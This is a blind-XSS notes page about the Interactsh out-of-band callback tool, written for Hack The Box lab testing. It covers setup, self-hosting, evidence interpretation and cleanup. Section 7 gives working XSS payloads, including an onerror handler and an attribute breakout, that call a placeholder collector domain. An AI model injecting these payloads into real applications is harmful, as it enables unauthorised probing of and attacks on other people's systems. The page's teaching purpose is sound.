---
title: "Blind XSS Tool - Interactsh"
description: "Interactsh generates unique out-of-band interaction domains and reports DNS, HTTP, SMTP, LDAP, and other callbacks. For blind XSS, it is a fast way to…"
category: web
tags: ["web", "xss"]
tools: []
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Web/Blind XSS Tool - Interactsh.md"
---
# Blind XSS Tool — Interactsh `fas:ClipboardList`

## Summary `ris:Eye`

[Interactsh](https://github.com/projectdiscovery/interactsh) generates unique out-of-band interaction domains and reports DNS, HTTP, SMTP, LDAP, and other callbacks. For blind XSS, it is a fast way to determine whether an unseen browser resolved or requested a unique address. It is lighter than XSS Hunter or ezXSS, but it does not automatically provide the same screenshots, DOM captures, or browser-specific evidence.

> [!danger]+ HTB-Only Boundary
> `fas:TriangleExclamation`
> 1. Use Interactsh only in Hack The Box, deliberately vulnerable applications, or systems you own and are explicitly authorised to test.
> 2. Start with callback-only probes that collect no cookies, DOM, or browser storage.
> 3. Public Interactsh services are third-party infrastructure; do not send sensitive lab data in callback paths.
> 4. See Cross-Site Scripting (XSS) - HTB Cheat Sheet for context-specific payloads and impact validation.

---

## Conceptual Information `ris:GlobalLine`

### What Interactsh Proves

| Observation | Strongest safe conclusion | What it does not prove |
|---|---|---|
| DNS callback only | A system resolved the unique hostname | Browser JavaScript execution |
| HTTP request for an injected image URL | A renderer parsed the resource reference and requested it | JavaScript execution |
| HTTP request created inside an event handler | Browser-side JavaScript executed and egress was available | Cookie access or privileged actions |
| Repeated callbacks | The stored value was rendered more than once | Number of distinct users without correlation evidence |
| No callback | Nothing reached this collector during the observation window | Absence of XSS; CSP, routing, rendering, or timing may block it |

### Choose the Right Collector

| Need | Recommended tool |
|---|---|
| Fast unique DNS/HTTP confirmation | **Interactsh** |
| Screenshots, DOM, and rich browser reports | Blind XSS Tool - XSS Hunter |
| Flexible self-hosted payload and notification controls | Blind XSS Tool - ezXSS |
| Raw callback visible over the HTB VPN | Python HTTP server or Netcat from the main XSS note |

> [!info]+ Correlation Model
> `ris:FileList`
> 1. The client generates a unique domain containing a correlation identifier and nonce.
> 2. The server records interactions for that identifier.
> 3. The client polls and decrypts or displays matching events.
> 4. Add your own field label as a subdomain or path only when it remains within the generated unique domain structure.

---

## Tools Overview `fas:Screwdriver`

> [!info]+ [Interactsh Web Client](https://app.interactsh.com) Overview
> `ris:GlobalLine`
> 1. Browser-based dashboard with no local installation.
> 2. Stores session state in browser storage.
> 3. Best for a quick, non-sensitive HTB callback test.

> [!info]+ Interactsh CLI Client Overview
> `fas:Terminal`
> 1. Generates payloads and polls for interactions in a terminal.
> 2. Supports session files, JSON output, custom servers, and protected-server tokens.
> 3. Best for reproducible lab notes and long-running polling.

> [!info]+ Interactsh Server Overview
> `ris:Radar`
> 1. Self-hosted DNS and application-protocol interaction collector.
> 2. Requires a dedicated domain, nameserver delegation, a public server, and careful exposure controls.
> 3. Best when public shared infrastructure is unsuitable or unreliable.

---

## Commands and Implementation `ris:Command`

### 1. Hosted Web Client — Fastest Start

1. Open [https://app.interactsh.com](https://app.interactsh.com).
2. Copy the unique generated domain.
3. Open `https://UNIQUE_DOMAIN/self-test` in a separate lab browser tab.
4. Confirm that DNS and HTTP events appear.
5. Keep the tab open while testing the HTB field.
6. Export or record the minimal callback evidence, then clear the browser session when finished.

> [!warning]+ Hosted Service Boundary
> `fas:TriangleExclamation`
> 1. Treat the generated domain as temporary.
> 2. Do not place cookies, tokens, DOM content, usernames, or flags in the callback URL.
> 3. Public server availability and default domains may change; use the CLI or self-hosting when reliability matters.

### 2. Install the CLI with Go

The project README currently requires Go `1.20` or newer for source installation.

```bash
go version
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -version
```

> [!info]+ Command Breakdown
> `fas:Terminal`
> 1. **`go version`**: Confirm the local Go toolchain meets the project requirement.
> 2. **`@latest`**: Installs the current published client from the official module path.
> 3. Ensure the Go binary directory is in `PATH` if the final command is not found.

### 3. Start a Persistent Client Session

```bash
interactsh-client -sf interactsh-htb.session
[INF] Listing 1 payload for OOB Testing
UNIQUE_CORRELATION_ID.oast.example
```

> [!info]+ Session Breakdown
> `ris:FileList`
> 1. **`-sf interactsh-htb.session`**: Saves the client session so polling can resume after interruption.
> 2. The displayed hostname is unique to this session; copy it exactly.
> 3. Keep the session file private because it associates the client with its interactions.
> 4. The default public domains may rotate, so use the value printed by the client rather than a hard-coded suffix.

If the current public service requires ProjectDiscovery authentication:

```bash
interactsh-client -auth
```

> [!info]+ Authentication Note
> `ris:LockPassword`
> 1. Follow the interactive prompt and use your own ProjectDiscovery Cloud Platform API key.
> 2. Do not paste API keys into command history or the Obsidian vault.
> 3. Public-server authentication is separate from a token used by a protected self-hosted server.

### 4. Run the CLI Client with Docker

```bash
docker run --rm -it projectdiscovery/interactsh-client:latest
[INF] Listing 1 payload for OOB Testing
UNIQUE_CORRELATION_ID.oast.example
```

> [!info]+ Docker Breakdown
> `fas:Terminal`
> 1. **`--rm`**: Removes the temporary container after exit.
> 2. **`-it`**: Keeps the polling client interactive.
> 3. Mount a dedicated directory only when you need persistent session or output files.

Persist a session file in the current directory:

```bash
mkdir -p interactsh-state
docker run --rm -it \
  -v "$PWD/interactsh-state:/state" \
  projectdiscovery/interactsh-client:latest \
  -sf /state/htb.session
```

> [!warning]+ Session Storage
> `fas:TriangleExclamation`
> 1. Restrict the `interactsh-state` directory to your user.
> 2. Do not commit session or JSON output files.
> 3. Remove them after recording the required HTB evidence.

### 5. Verify the Collector Before Injection

```bash
curl -i "https://UNIQUE_DOMAIN/self-test"
HTTP/2 200
content-type: text/html; charset=utf-8
```

> [!success]+ Expected Result
> `ris:Key`
> 1. The client reports a DNS lookup and an HTTP request for `/self-test`.
> 2. The event time, protocol, source address, and request metadata appear.
> 3. If only DNS appears, inspect TLS, routing, and HTTP service availability before planting the HTB payload.

### 6. Create Unique HTB Correlation Labels

| Field under test | Example label |
|---|---|
| Support message | `support-message-20260808-1530` |
| Display name | `profile-name-20260808-1535` |
| `User-Agent` header | `user-agent-20260808-1540` |
| `Referer` header | `referer-20260808-1545` |
| Filename | `filename-20260808-1550` |

Use the label in the path when the generated domain format must remain unchanged:

```text
https://UNIQUE_DOMAIN/support-message-20260808-1530
```

> [!tip]+ Attribution Rule
> `fas:Lightbulb`
> 1. Submit one labelled field at a time.
> 2. Keep a small table mapping label → request → account → time.
> 3. Do not include flags, usernames, or secrets in labels.

### 7. Blind-XSS Callback Payloads

Replace `UNIQUE_DOMAIN` and the label with values from the active session.

```html
<!-- Resource callback: proves HTML parsing and outbound resource loading -->
<img src="https://UNIQUE_DOMAIN/support-message-20260808-1530">

<!-- Event-handler callback: proves JavaScript execution -->
<img src=x onerror="new Image().src='https://UNIQUE_DOMAIN/js-support-message-20260808-1530'">

<!-- Confirmed double-quoted attribute breakout -->
"><img src=x onerror="new Image().src='https://UNIQUE_DOMAIN/attr-profile-name-20260808-1535'">
```

> [!warning]+ Payload Interpretation
> `fas:TriangleExclamation`
> 1. The first payload can fire without JavaScript; report it as resource loading, not script execution.
> 2. The second and third callbacks originate inside an event handler and therefore support a JavaScript-execution finding.
> 3. CSP, sanitisation, mixed-content policy, or outbound filtering may prevent a callback even when injection exists.
> 4. Keep callback URLs free of cookies and other sensitive values on public infrastructure.

### 8. Read and Record an Interaction

| Field | Interpretation |
|---|---|
| Protocol | DNS, HTTP, SMTP, LDAP, or another supported interaction |
| Unique ID | Connects the event to the generated payload |
| Remote address | Network source seen by the collector; may be a proxy or resolver |
| Timestamp | Helps correlate asynchronous rendering |
| HTTP path | Identifies the tested field label |
| Headers | May reveal browser, proxy, or automation context |
| Raw request | Evidence of the exact callback; may contain sensitive values if the payload included them |

> [!success]+ Minimum HTB Evidence
> `ris:Key`
> 1. Screenshot or export the interaction with its unique label and timestamp.
> 2. Save the request that planted the payload.
> 3. State whether evidence was DNS-only, resource loading, or JavaScript-created HTTP.
> 4. Remove the stored payload and delete local session/output data after the write-up is complete.

---

## Optional Self-Hosting `ris:Global`

> [!important]+ Self-Hosting Requirements
> `fas:TriangleExclamation`
> 1. A dedicated domain used only for OAST.
> 2. Glue or host records such as `ns1` and `ns2` pointing to the server public IP.
> 3. Nameserver delegation of the OAST domain to those hosts.
> 4. A public VPS able to bind DNS and HTTP/TLS ports.
> 5. A protected client token, restricted administration, monitoring, and a retention decision.

### 9. Configure DNS Delegation

At the registrar or authoritative DNS provider:

1. Create host/glue record `ns1.oast.YOUR_DOMAIN` → `SERVER_IP`.
2. Create host/glue record `ns2.oast.YOUR_DOMAIN` → `SERVER_IP`.
3. Delegate `oast.YOUR_DOMAIN` to `ns1.oast.YOUR_DOMAIN` and `ns2.oast.YOUR_DOMAIN`.
4. Wait for delegation to propagate.
5. Verify from an independent resolver.

```bash
dig NS oast.YOUR_DOMAIN +short
dig A ns1.oast.YOUR_DOMAIN +short
dig A ns2.oast.YOUR_DOMAIN +short
```

> [!success]+ Expected DNS Result
> `ris:Key`
> 1. The delegated nameservers are returned for the OAST domain.
> 2. Both nameserver hosts resolve to the intended server address.
> 3. Do not start payload testing until delegation is consistent externally.

### 10. Install and Start the Server

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest
interactsh-server -version
sudo interactsh-server -domain oast.YOUR_DOMAIN
```

> [!info]+ Server Breakdown
> `fas:Terminal`
> 1. **`-domain`**: Sets the dedicated delegated OAST domain.
> 2. The server attempts to discover public addresses and configure supported listeners.
> 3. Privileged ports require appropriate OS capabilities or a carefully managed service account; avoid running a long-lived service interactively as root.
> 4. Inspect `interactsh-server -h` on the installed version before production use because supported services and flags evolve.

Common service ports include:

| Protocol | Port | Required for browser-focused XSS? |
|---|---:|---|
| DNS | UDP/TCP `53` | Yes |
| HTTP | TCP `80` | Useful for redirects and plaintext labs |
| HTTPS | TCP `443` | Yes for secure callback reliability |
| SMTP/SMTPS | TCP `25`/`587` | No, unless testing mail interactions |
| LDAP | TCP `389` | No, unless testing LDAP interactions |

> [!warning]+ Least Exposure
> `fas:TriangleExclamation`
> 1. Expose only the protocols required for the authorised test.
> 2. Use the installed version's help output to disable unused listeners where supported.
> 3. Apply cloud and host firewall rules together.
> 4. Run the service under a dedicated account with only the required bind capabilities.

### 11. Connect a Client to the Self-Hosted Server

```bash
interactsh-client -server oast.YOUR_DOMAIN
```

For a protected server:

```bash
interactsh-client -server oast.YOUR_DOMAIN -token SELF_HOSTED_CLIENT_TOKEN
```

> [!info]+ Client Connection
> `ris:LockPassword`
> 1. **`-server`**: Overrides the rotating public server list.
> 2. **`-token`**: Authenticates to a protected self-hosted server.
> 3. Store the token in a protected configuration file or secret manager rather than shell history.

### 12. Optional Static Payload Hosting

The self-hosted server can expose files under its `/s/` path when started with an HTTP directory:

```bash
interactsh-server \
  -domain oast.YOUR_DOMAIN \
  -http-directory ./lab-payloads
```

> [!warning]+ Static Hosting Boundary
> `fas:TriangleExclamation`
> 1. Host only minimal, reviewed HTB lab files.
> 2. Do not enable dynamic responses or arbitrary public script hosting on a domain shared with other services.
> 3. Keep the directory read-only to the service and review its contents before every run.

---

## Operations and Lifecycle `ris:FileList`

### Logs and Session Output

```bash
interactsh-client -sf interactsh-htb.session -json -o interactions.jsonl
```

> [!info]+ Output Breakdown
> `ris:FileList`
> 1. **`-json`**: Produces structured interaction records.
> 2. **`-o`**: Writes events to the named file.
> 3. Protect the session and JSONL files because request headers and callback paths may be sensitive.

### Update

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -version
```

For Docker, pull the current client image before the next lab:

```bash
docker pull projectdiscovery/interactsh-client:latest
```

> [!tip]+ Update Check
> `fas:Lightbulb`
> 1. Review the official release notes before updating a self-hosted server.
> 2. Verify client/server compatibility and complete a DNS-plus-HTTP self-test.
> 3. Keep the previous binary or VPS snapshot until the new version is verified.

### Retention and Cleanup

1. Stop polling after the HTB observation window.
2. Export only the interaction records needed for the write-up.
3. Clear the hosted web client's browser storage when the session is no longer required.
4. Remove local session and JSONL files after evidence verification.
5. For self-hosting, stop the service, revoke client tokens, remove DNS delegation, and close exposed ports.
6. Keep no callback data beyond the lab/reporting requirement.

> [!danger]+ Self-Hosted Retirement
> `fas:TriangleExclamation`
> 1. Removing only the web service leaves delegated DNS and other listeners exposed.
> 2. Verify both cloud and host firewalls after shutdown.
> 3. Remove or repurpose the dedicated domain only after DNS caches have expired and no test payloads remain stored.

---

## Troubleshooting `ris:FileList`

> [!failure]+ No Interaction Appears
> `fas:CircleXmark`
> 1. Open the generated URL yourself and confirm DNS plus HTTP events.
> 2. Verify that the client is still polling the correct session.
> 3. Inspect the HTB browser Console and Network for CSP, TLS, mixed-content, or sanitisation failures.
> 4. Confirm the stored field is rendered by the expected user or background workflow.
> 5. Test a simple `<img src>` before an event-handler callback.

> [!failure]+ DNS Appears but HTTP Does Not
> `fas:CircleXmark`
> 1. Confirm the exact scheme and hostname requested by the payload.
> 2. Test HTTPS directly with `curl`.
> 3. Check server port exposure and certificate validity.
> 4. Remember that DNS-only evidence does not prove JavaScript execution.

> [!failure]+ Self-Hosted Domain Does Not Register
> `fas:CircleXmark`
> 1. Verify glue records and nameserver delegation from an external resolver.
> 2. Confirm UDP and TCP `53` reach the server.
> 3. Confirm no existing DNS daemon occupies port `53`.
> 4. Review server logs and the current version's help output.

> [!failure]+ Public Server or Authentication Error
> `fas:CircleXmark`
> 1. Run `interactsh-client -auth` if the selected public service requires a ProjectDiscovery API key.
> 2. Generate a fresh session rather than reusing an expired domain.
> 3. Try another official default server through the client's supported configuration.
> 4. Move to a protected self-hosted server when public availability is unsuitable.

---

## Lessons Learned `fas:Lightbulb`

1. DNS, resource loading, and JavaScript execution are three different evidence levels and must be reported separately.
2. Unique labels turn asynchronous blind callbacks into attributable findings.
3. Public OAST infrastructure is ideal for harmless reachability tests, not sensitive data collection.
4. Self-hosting improves control but adds DNS, TLS, firewall, token, logging, and retention responsibilities.

---

## References `fas:BookOpen`

1. [ProjectDiscovery Interactsh Repository](https://github.com/projectdiscovery/interactsh)
2. [Interactsh Web Client](https://app.interactsh.com)
3. [ProjectDiscovery Interactsh Release Article](https://projectdiscovery.io/blog/interactsh-release)
4. [Docker Client Image](https://hub.docker.com/r/projectdiscovery/interactsh-client)
5. Cross-Site Scripting (XSS) - HTB Cheat Sheet
6. Blind XSS Tool - XSS Hunter
7. Blind XSS Tool - ezXSS

#HTB #WebSecurity #XSS #BlindXSS #Interactsh #OAST
